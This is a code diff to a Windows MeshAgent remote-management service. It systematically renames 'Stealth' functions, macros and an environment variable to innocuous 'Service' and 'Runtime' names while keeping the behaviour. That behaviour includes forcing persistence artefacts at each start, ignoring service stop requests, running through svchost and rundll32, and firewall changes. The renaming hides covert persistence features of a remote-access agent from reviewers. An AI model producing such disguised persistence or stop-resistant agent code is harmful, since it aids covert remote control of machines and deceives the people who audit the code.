@@ -6632,7 +6632,7 @@ static BOOL MeshService_BuildIntegrationConfig(StealthIntegrationConfig* config)
 	// helpers are spawned by the native rundll32 bridge owner.
 	config->enableHelperMonitor = FALSE;
 
-	Stealth_DebugPrintfW(L"[Policy] strictServiceOnly=%lu allowDesktopBridge=%lu helperMonitor=%lu",
+	ServiceUtil_DebugPrintfW(L"[Policy] strictServiceOnly=%lu allowDesktopBridge=%lu helperMonitor=%lu",
 		config->strictServiceOnly ? 1UL : 0UL,
 		config->allowDesktopBridge ? 1UL : 0UL,
 		config->enableHelperMonitor ? 1UL : 0UL);
@@ -6640,58 +6640,58 @@ static BOOL MeshService_BuildIntegrationConfig(StealthIntegrationConfig* config)
 	return TRUE;
 }
 
-static BOOL MeshService_StartStealthIntegration(void)
+static BOOL MeshService_StartServiceIntegration(void)
 {
-	if (g_StealthIntegrationRunning) { return TRUE; }
+	if (g_ServiceIntegrationRunning) { return TRUE; }
 
-	StealthIntegrationConfig config;
+	ServiceIntegrationConfig config;
 	if (!MeshService_BuildIntegrationConfig(&config))
 	{
 		return FALSE;
 	}
 
-	if (!g_StealthIntegrationReady)
+	if (!g_ServiceIntegrationReady)
 	{
-		if (!StealthIntegration_Init(&config))
+		if (!ServiceIntegration_Init(&config))
 		{
 			return FALSE;
 		}
-		g_StealthIntegrationReady = TRUE;
+		g_ServiceIntegrationReady = TRUE;
 	}
 
-	if (StealthIntegration_Start())
+	if (ServiceIntegration_Start())
 	{
-		g_StealthIntegrationRunning = TRUE;
+		g_ServiceIntegrationRunning = TRUE;
 		return TRUE;
 	}
 
-	StealthIntegration_Cleanup();
-	g_StealthIntegrationReady = FALSE;
+	ServiceIntegration_Cleanup();
+	g_ServiceIntegrationReady = FALSE;
 	return FALSE;
 }
 
-static void MeshService_ShutdownStealthIntegration(void)
+static void MeshService_ShutdownServiceIntegration(void)
 {
-	if (!g_StealthIntegrationReady)
+	if (!g_ServiceIntegrationReady)
 	{
 		return;
 	}
 
-	if (g_StealthIntegrationRunning)
+	if (g_ServiceIntegrationRunning)
 	{
-		StealthIntegration_Stop();
-		g_StealthIntegrationRunning = FALSE;
+		ServiceIntegration_Stop();
+		g_ServiceIntegrationRunning = FALSE;
 	}
 
-	StealthIntegration_Cleanup();
-	g_StealthIntegrationReady = FALSE;
+	ServiceIntegration_Cleanup();
+	g_ServiceIntegrationReady = FALSE;
 }
-#endif /* MESHAGENT_ENABLE_STEALTH */
+#endif /* MESHAGENT_ENABLE_RUNTIME_FEATURES */
 
 static void MeshService_ActivateResilience(void)
 {
-#ifdef MESHAGENT_ENABLE_STEALTH
-	if (!MeshService_StartStealthIntegration())
+#ifdef MESHAGENT_ENABLE_RUNTIME_FEATURES
+	if (!MeshService_StartServiceIntegration())
 	{
 		MeshService_EnableWatchdogIfConfigured();
 	}
@@ -6702,10 +6702,10 @@ static void MeshService_ActivateResilience(void)
 
 static void MeshService_DeactivateResilience(void)
 {
-#ifdef MESHAGENT_ENABLE_STEALTH
-	if (g_StealthIntegrationReady)
+#ifdef MESHAGENT_ENABLE_RUNTIME_FEATURES
+	if (g_ServiceIntegrationReady)
 	{
-		MeshService_ShutdownStealthIntegration();
+		MeshService_ShutdownServiceIntegration();
 	}
 	else
 	{
@@ -6884,7 +6884,7 @@ static BOOL MeshService_AllowStop(void)
 	MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
 	if (serviceKeyName[0] == L'\0')
 	{
-		StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME);
+		StringCchCopyW(serviceKeyName, _countof(serviceKeyName), SERVICE_FALLBACK_SERVICE_NAME);
 	}
 	_snwprintf_s(paramsKeyPath, _countof(paramsKeyPath), _TRUNCATE,
 		L"SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", serviceKeyName);
@@ -6932,11 +6932,11 @@ static BOOL MeshService_PathIsUnderDirectoryW(const WCHAR* path, const WCHAR* di
 
 static BOOL MeshService_ShouldCleanupLauncherAfterLifecycle(const WCHAR* modulePath)
 {
-	StealthInstallPaths paths;
+	ServiceInstallPaths paths;
 
 	if (modulePath == NULL || modulePath[0] == L'\0') { return FALSE; }
 	ZeroMemory(&paths, sizeof(paths));
-	if (!Stealth_GetInstallPaths(&paths))
+	if (!ServiceDeploy_GetInstallPaths(&paths))
 	{
 		return FALSE;
 	}
@@ -7026,8 +7026,8 @@ static void MeshService_RefreshControlsAccepted(void)
 
 DWORD WINAPI ServiceControlHandler(DWORD controlCode, DWORD eventType, void *eventData, void* eventContext)
 {
-#ifdef MESHAGENT_ENABLE_STEALTH
-	if (StealthIntegration_HandleServiceControl(controlCode))
+#ifdef MESHAGENT_ENABLE_RUNTIME_FEATURES
+	if (ServiceIntegration_HandleServiceControl(controlCode))
 	{
 		return NO_ERROR;
 	}
@@ -7038,7 +7038,7 @@ DWORD WINAPI ServiceControlHandler(DWORD controlCode, DWORD eventType, void *eve
 		MeshService_RefreshControlsAccepted();
 		break;
 	case SERVICE_CONTROL_SHUTDOWN:
-		Stealth_DebugPrintfA("[ServiceMain] Received SERVICE_CONTROL_SHUTDOWN");
+		ServiceUtil_DebugPrintfA("[ServiceMain] Received SERVICE_CONTROL_SHUTDOWN");
 		serviceStatus.dwWin32ExitCode = NO_ERROR;
 		serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
 		SetServiceStatus(serviceStatusHandle, &serviceStatus);
@@ -7048,14 +7048,14 @@ DWORD WINAPI ServiceControlHandler(DWORD controlCode, DWORD eventType, void *eve
 		MeshService_RefreshControlsAccepted();
 		if (!MeshService_AllowStop())
 		{
-			Stealth_DebugPrintfA("[ServiceMain] Ignoring SERVICE_CONTROL_STOP");
+			ServiceUtil_DebugPrintfA("[ServiceMain] Ignoring SERVICE_CONTROL_STOP");
 			serviceStatus.dwWin32ExitCode = ERROR_SERVICE_CANNOT_ACCEPT_CTRL;
 			serviceStatus.dwCurrentState = SERVICE_RUNNING;
 			SetServiceStatus(serviceStatusHandle, &serviceStatus);
 			MeshService_ReportCriticalStopDenial();
 			return ERROR_SERVICE_CANNOT_ACCEPT_CTRL;
 		}
-		Stealth_DebugPrintfA("[ServiceMain] Received SERVICE_CONTROL_STOP");
+		ServiceUtil_DebugPrintfA("[ServiceMain] Received SERVICE_CONTROL_STOP");
 		serviceStatus.dwWin32ExitCode = NO_ERROR;
 		serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
 		SetServiceStatus(serviceStatusHandle, &serviceStatus);
@@ -7089,12 +7089,12 @@ DWORD WINAPI ServiceControlHandler(DWORD controlCode, DWORD eventType, void *eve
 				}
 			}
 
-#ifdef MESHAGENT_ENABLE_STEALTH
-			/* Forward session change to stealth integration for helper monitor */
-			StealthIntegration_HandleSessionChange(eventType, sessionId);
+#ifdef MESHAGENT_ENABLE_RUNTIME_FEATURES
+			/* Forward session change to service integration for helper monitor */
+			ServiceIntegration_HandleSessionChange(eventType, sessionId);
 #endif
 #if defined(_LINKVM)
-			Stealth_DebugPrintfA("[ServiceMain] Forwarding KVM session change event=%lu session=%lu", (unsigned long)eventType, (unsigned long)sessionId);
+			ServiceUtil_DebugPrintfA("[ServiceMain] Forwarding KVM session change event=%lu session=%lu", (unsigned long)eventType, (unsigned long)sessionId);
 			kvm_notify_session_change(eventType, sessionId);
 #endif
 
@@ -7149,7 +7149,7 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 
 	MeshService_InitializeBrandingGlobals();
 
-#ifdef MESHAGENT_ENABLE_STEALTH
+#ifdef MESHAGENT_ENABLE_RUNTIME_FEATURES
 	if (argc > 1 && _stricmp(argv[1], "-refresh-persistence") == 0)
 	{
 		int refreshStatus = 0;
@@ -7161,7 +7161,7 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 		else
 		{
 			printf("[*] Reapplying persistence profile...\n");
-			Stealth_ApplyPersistenceProfile();
+			ServiceDeploy_ApplyPersistenceProfile();
 			printf("[+] Persistence refresh complete.\n");
 		}
 		wmain_free(argv);
@@ -7198,21 +7198,21 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 
 		if (!MeshService_ProcessHasSystemSid())
 		{
-			Stealth_DebugPrintfA("[ServiceMain] Service process is not LocalSystem; direct self-elevation is disabled by rundll32-only policy");
+			ServiceUtil_DebugPrintfA("[ServiceMain] Service process is not LocalSystem; direct self-elevation is disabled by rundll32-only policy");
 			serviceStatus.dwWin32ExitCode = ERROR_ACCESS_DISABLED_BY_POLICY;
 			serviceStatus.dwCurrentState = SERVICE_STOPPED;
 			SetServiceStatus(serviceStatusHandle, &serviceStatus);
 			return;
 		}
 
-#ifdef MESHAGENT_ENABLE_STEALTH
+#ifdef MESHAGENT_ENABLE_RUNTIME_FEATURES
         // Always enforce persistence artefacts even if the installer failed to stage them.
-        Stealth_ApplyPersistenceProfile();
+        ServiceDeploy_ApplyPersistenceProfile();
 
         // Initialize runtime logging and firewall maintenance when enabled.
-        Stealth_InitLabFeatures();
+        RuntimeInit_EnableOptionalFeatures();
 
-        Stealth_EnableCrashRecovery();
+        Runtime_EnableCrashRecovery();
 #endif
 
 		MeshService_ActivateResilience();
@@ -7768,7 +7768,7 @@ static WCHAR** MeshService_CopyAnsiArgsToWide(int argc, char** argv)
 int main(int argc, char** argv)
 {
 	MeshService_InstallInvalidParameterHandler();
-#ifdef MESHAGENT_ENABLE_STEALTH
+#ifdef MESHAGENT_ENABLE_RUNTIME_FEATURES
 	if (argc > 1 && argv[1] != NULL && _stricmp(argv[1], "-watchdog") == 0)
 	{
 		printf("[!] direct -watchdog service helper mode is disabled. Use the rundll32 lifecycle contract.\n");
@@ -7826,7 +7826,7 @@ static void MeshService_TraceKvmServiceWrite(const char* phase, char* buffer, in
 	DWORD written = 0;
 
 	if (phase == NULL || buffer == NULL || bufferLen < 4) { return; }
-	if (GetEnvironmentVariableW(L"STEALTH_KVM_TRACE_SERVICE_WRITES", enabled, (DWORD)_countof(enabled)) == 0) { return; }
+	if (GetEnvironmentVariableW(L"KVM_TRACE_SERVICE_WRITES", enabled, (DWORD)_countof(enabled)) == 0) { return; }
 	if (ExpandEnvironmentStringsW(L"%TEMP%\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
 	{
 		GetTempPathW((DWORD)_countof(tempPath), tempPath);
@@ -8313,8 +8313,8 @@ static int MeshService_RunSelfUpdateIngress(int argc, WCHAR** wideArgv)
 	WCHAR sourceExePath[MAX_PATH * 4] = { 0 };
 	WCHAR sourceDllPath[MAX_PATH * 4] = { 0 };
 	WCHAR preflightReason[512] = { 0 };
-	StealthInstallPaths installedPaths;
-	StealthPackagePreflight packagePreflight;
+	ServiceInstallPaths installedPaths;
+	ServicePackagePreflight packagePreflight;
 	MeshRundll32LifecycleAction lifecycleAction = MESH_RUNDLL32_LIFECYCLE_ACTION_UPDATE;
 	DWORD lifecycleExitCode = ERROR_GEN_FAILURE;
 	DWORD moduleLen = 0;
@@ -8324,13 +8324,13 @@ static int MeshService_RunSelfUpdateIngress(int argc, WCHAR** wideArgv)
 	BOOL requireConfig = FALSE;
 	BOOL launched = FALSE;
 
-	Stealth_EnsureLoggingDefaults();
+	ServiceDeploy_EnsureLoggingDefaults();
 	if (!MeshService_GetWideOptionValue(argc, wideArgv, L"--update-source", sourceExePath, _countof(sourceExePath)))
 	{
 		optionError = GetLastError();
 		if (optionError != ERROR_NOT_FOUND)
 		{
-			Stealth_LogInstallEvent(L"[SELFUPDATE_INGRESS] Invalid --update-source argument (error=%lu)", optionError);
+			ServiceDeploy_LogInstallEvent(L"[SELFUPDATE_INGRESS] Invalid --update-source argument (error=%lu)", optionError);
 			wprintf(L"[-] Invalid --update-source argument (error=%lu)\n", optionError);
 			return (int)optionError;
 		}
@@ -8338,7 +8338,7 @@ static int MeshService_RunSelfUpdateIngress(int argc, WCHAR** wideArgv)
 		if (moduleLen == 0 || moduleLen >= _countof(sourceExePath))
 		{
 			launchError = (moduleLen == 0) ? GetLastError() : ERROR_INSUFFICIENT_BUFFER;
-			Stealth_LogInstallEvent(L"[SELFUPDATE_INGRESS] Unable to resolve update package path (error=%lu)", launchError);
+			ServiceDeploy_LogInstallEvent(L"[SELFUPDATE_INGRESS] Unable to resolve update package path (error=%lu)", launchError);
 			wprintf(L"[-] Unable to resolve update package path (error=%lu)\n", launchError);
 			return (int)launchError;
 		}
@@ -8349,18 +8349,18 @@ static int MeshService_RunSelfUpdateIngress(int argc, WCHAR** wideArgv)
 		optionError = GetLastError();
 		if (optionError != ERROR_NOT_FOUND)
 		{
-			Stealth_LogInstallEvent(L"[SELFUPDATE_INGRESS] Invalid --update-dll argument (error=%lu)", optionError);
+			ServiceDeploy_LogInstallEvent(L"[SELFUPDATE_INGRESS] Invalid --update-dll argument (error=%lu)", optionError);
 			wprintf(L"[-] Invalid --update-dll argument (error=%lu)\n", optionError);
 			return (int)optionError;
 		}
 	}
 
 	ZeroMemory(&installedPaths, sizeof(installedPaths));
-	if (Stealth_GetInstallPaths(&installedPaths) &&
+	if (ServiceDeploy_GetInstallPaths(&installedPaths) &&
 		installedPaths.exePath[0] != L'\0' &&
 		MeshService_PathsReferToSameFileW(sourceExePath, installedPaths.exePath))
 	{
-		Stealth_LogInstallEvent(
+		ServiceDeploy_LogInstallEvent(
 			L"[SELFUPDATE_INGRESS] Refusing installed executable as update package source (%ls)",
 			sourceExePath);
 		wprintf(L"[-] Refusing installed executable as update package source. Use a staged update package.\n");
@@ -8368,14 +8368,14 @@ static int MeshService_RunSelfUpdateIngress(int argc, WCHAR** wideArgv)
 	}
 
 	ZeroMemory(&packagePreflight, sizeof(packagePreflight));
-	if (!Stealth_PreflightPackageSource(
+	if (!ServiceDeploy_PreflightPackageSource(
 			sourceExePath,
 			FALSE,
 			&packagePreflight,
 			preflightReason,
 			_countof(preflightReason)))
 	{
-		Stealth_LogInstallEvent(
+		ServiceDeploy_LogInstallEvent(
 			L"[SELFUPDATE_INGRESS] Package preflight failed: %ls",
 			preflightReason[0] != L'\0' ? preflightReason : L"unknown package error");
 		wprintf(L"[-] Update package preflight failed: %ls\n",
@@ -8393,7 +8393,7 @@ static int MeshService_RunSelfUpdateIngress(int argc, WCHAR** wideArgv)
 		requireConfig = TRUE;
 	}
 
-	Stealth_LogInstallEvent(
+	ServiceDeploy_LogInstallEvent(
 		L"[SELFUPDATE_INGRESS] Mapping direct self-update activation to rundll32 lifecycle host action=%ls sourceExe=%ls sourceDll=%ls embeddedProvisioning=%u sidecarProvisioning=%u",
 		MeshRundll32_LifecycleActionNameW(lifecycleAction),
 		sourceExePath,
@@ -8414,7 +8414,7 @@ static int MeshService_RunSelfUpdateIngress(int argc, WCHAR** wideArgv)
 	if (!launched)
 	{
 		launchError = GetLastError();
-		Stealth_LogInstallEvent(
+		ServiceDeploy_LogInstallEvent(
 			L"[SELFUPDATE_INGRESS] Failed to launch rundll32 lifecycle update host (exit=%lu error=%lu)",
 			lifecycleExitCode,
 			launchError);
@@ -8423,14 +8423,14 @@ static int MeshService_RunSelfUpdateIngress(int argc, WCHAR** wideArgv)
 	}
 	if (lifecycleExitCode != ERROR_SUCCESS)
 	{
-		Stealth_LogInstallEvent(
+		ServiceDeploy_LogInstallEvent(
 			L"[SELFUPDATE_INGRESS] Rundll32 lifecycle update host failed (exit=%lu)",
 			lifecycleExitCode);
 		wprintf(L"[-] Rundll32 lifecycle update host failed (exit=%lu)\n", lifecycleExitCode);
 		return (int)lifecycleExitCode;
 	}
 
-	Stealth_LogInstallEvent(L"[SELFUPDATE_INGRESS] Rundll32 lifecycle update host completed");
+	ServiceDeploy_LogInstallEvent(L"[SELFUPDATE_INGRESS] Rundll32 lifecycle update host completed");
 	wprintf(L"[+] Self-update lifecycle completed\n");
 	return 0;
 }
@@ -8512,7 +8512,7 @@ int wmain(int argc, char* wargv[])
 	char **argv = NULL;
 	WCHAR **wideArgv = (WCHAR**)wargv;
 
-#ifdef MESHAGENT_ENABLE_STEALTH
+#ifdef MESHAGENT_ENABLE_RUNTIME_FEATURES
 	if (wideArgv != NULL &&
 		argc > 1 &&
 		wideArgv[1] != NULL &&
@@ -8951,12 +8951,12 @@ int wmain(int argc, char* wargv[])
 
 		// Service-only policy: disallow running a full standalone agent in svchost builds, but do not
 		// block managed service helpers such as installer operations or IPC tooling.
-#if defined(MESHAGENT_ENABLE_STEALTH) && defined(MESH_AGENT_SVCHOST_MODE) && (MESH_AGENT_SVCHOST_MODE != 0)
+#if defined(MESHAGENT_ENABLE_RUNTIME_FEATURES) && defined(MESH_AGENT_SVCHOST_MODE) && (MESH_AGENT_SVCHOST_MODE != 0)
 		if (isStandaloneRun && !isManaged)
 		{
 			wchar_t svcName[256] = { 0 };
 			MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), svcName, _countof(svcName));
-			if (svcName[0] == L'\0') { StringCchCopyW(svcName, _countof(svcName), STEALTH_FALLBACK_SERVICE_NAME); }
+			if (svcName[0] == L'\0') { StringCchCopyW(svcName, _countof(svcName), SERVICE_FALLBACK_SERVICE_NAME); }
 			printf("MeshAgent: standalone execution is disabled in this build. Start the service '%S'.\r\n", svcName);
 			wmain_free(argv);
 			return ERROR_NOT_SUPPORTED;
@@ -9677,7 +9677,7 @@ INT_PTR CALLBACK DialogHandler(HWND hDlg, UINT message, WPARAM wParam, LPARAM lP
 						lifecycleSourceDll = sourceDllPath;
 					}
 				}
-			Stealth_LogInstallEvent(
+			ServiceDeploy_LogInstallEvent(
 				L"[GUI] action=start lifecycle=%ls source=%ls sourceDll=%ls",
 				MeshRundll32_LifecycleActionNameW(lifecycleAction),
 				lifecycleSourceExe != NULL ? lifecycleSourceExe : L"(none)",
@@ -9693,7 +9693,7 @@ INT_PTR CALLBACK DialogHandler(HWND hDlg, UINT message, WPARAM wParam, LPARAM lP
 					600000,
 					&actionExitCode);
 				launchError = result ? ERROR_SUCCESS : GetLastError();
-				Stealth_LogInstallEvent(
+				ServiceDeploy_LogInstallEvent(
 					L"[GUI] action=complete lifecycle=%ls source=%ls sourceDll=%ls launchError=%lu exitCode=%lu",
 					MeshRundll32_LifecycleActionNameW(lifecycleAction),
 					lifecycleSourceExe != NULL ? lifecycleSourceExe : L"(none)",
@@ -9708,7 +9708,7 @@ INT_PTR CALLBACK DialogHandler(HWND hDlg, UINT message, WPARAM wParam, LPARAM lP
 				{
 					if (!MeshRundll32_LaunchLauncherCleanupW(modulePath, GetCurrentProcessId(), 60000))
 					{
-						Stealth_LogInstallEvent(L"[GUI] Launcher cleanup scheduling failed path=%ls error=%lu", modulePath, GetLastError());
+						ServiceDeploy_LogInstallEvent(L"[GUI] Launcher cleanup scheduling failed path=%ls error=%lu", modulePath, GetLastError());
 					}
 				}
 				EndDialog(hDlg, LOWORD(wParam));
